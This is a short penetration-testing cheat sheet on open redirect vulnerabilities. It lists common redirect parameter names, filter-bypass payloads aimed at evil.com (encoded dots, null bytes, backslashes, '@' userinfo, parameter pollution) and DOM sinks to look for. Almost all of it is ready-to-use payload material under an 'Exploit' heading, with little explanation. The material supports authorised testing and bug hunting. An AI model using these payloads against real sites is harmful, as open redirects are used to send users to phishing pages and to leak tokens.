---
title: Open redirect
description: Attacker redirects a user to an external URL
---
## Exploit
### Common injection parameters
```url
/
?next
?url
?target
?rurl
?dest
?destination
?redir
?redirect_uri
?redirect_url
?redirect
/redirect/
/cgi-bin/redirect.cgi?
/out/
/out?
?view
/login?to
?image_url
?go
?return
?returnTo
?return_to
?checkout_url
?continue
?return_path
success
data
qurl
login
logout
ext
clickurl
goto
rit_url
forward_url
@https://
forward
pic
callback_url
jump
jump_url
click?u
originUrl
origin
Url
desturl
u
page
u1
action
action_url
Redirect
sp_url
service
recurl
j?url
url//
uri
u
allinurl:
q
link
src
tc?src
linkAddress
location
burl
request
backurl
RedirectUrl
Redirect
ReturnUrl
```
### Bypass blacklist
`http` blacklist bypass:

```html
//evil.com
```

`//` blacklist bypass:
```url
https:evil.com
```
Using `//` to bypass `//` blacklisted keyword (Browsers see `//` as `//`)
```url
\/\/evil.com/
/\/evil.com/
```
Using `/` to bypass:
```url
/\evil.com
```

URL encode Unicode full stop 。
```url
//evil%E3%80%82com
```

Null byte
```html
//evil%00.com
```
Parameter pollution
```url
?next=whitelisted.com&next=evil.com
```
Using "@" character, browser will redirect to anything after the "@"
```url
http://www.theirsite.com@evil.com/
```
### DOM based
View the page source. Common sink for open redirect:
```js
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()
```
